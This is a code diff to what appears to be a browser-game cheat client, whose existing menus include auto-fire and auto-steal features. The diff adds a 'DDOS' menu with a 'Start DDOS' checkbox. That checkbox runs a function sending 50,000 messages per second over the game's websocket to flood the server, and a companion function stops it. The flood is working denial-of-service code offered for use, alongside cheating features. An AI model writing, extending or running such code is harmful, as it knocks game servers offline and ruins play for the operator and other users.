@@ -1717,7 +1717,8 @@ function createDots(a, b) {
 	l.fill();
 	return cnvs
 }
-let Dayfalse = createDots("#e39716", 12);
+
+let Int, ddos, Dayfalse = createDots("#e39716", 12);
 let Daytrue = createDots("#fff", 12);
 let TotemDot = createDots("#000000", 12);
 let DeathDot = createDots("#F76161", 12);
@@ -2073,6 +2074,11 @@ window.Utils = {
 			label: "AutoFire&AutoWall&AutoRes",
 			open: false
 		});
+        gui.Register({
+			type: "folder",
+			label: "DDOS",
+			open: false
+		});
 		gui.Register({
 			type: "folder",
 			label: "AutoCraft&Recycle",
@@ -2246,6 +2252,17 @@ window.Utils = {
 	}], {
 	folder: "AutoFire&AutoWall&AutoRes"
 	});
+    e.Register([{
+        type: "checkbox",
+        label: "Start DDOS",
+        object: ddos,
+        property: "on",
+        onChange: data => {
+            !0 === data ? DDoS() : !1 === data && StopDDoS()
+        }
+    }], {
+        folder: "DDOS"
+    });
 		gui.Register([{
 			type: "button",
 			label: "Set AutoSteal Key",
@@ -9062,7 +9079,18 @@ function je(a, e, f) {
 	c.restore();
 	return d
 }
-
+function DDoS(){
+    Int = setInterval((() => {
+		let i = 5e4;
+		for (; i--;) vw.oOW.send(JSON.stringify([11]))
+	}), 1e3)
+}
+function StopDDoS() {
+	clearInterval(Int)
+}
+ddos = {
+	on: !1
+}
 function ke(a, e, f) {
 	var d = document.createElement("canvas"),
 		c = d.getContext("2d");
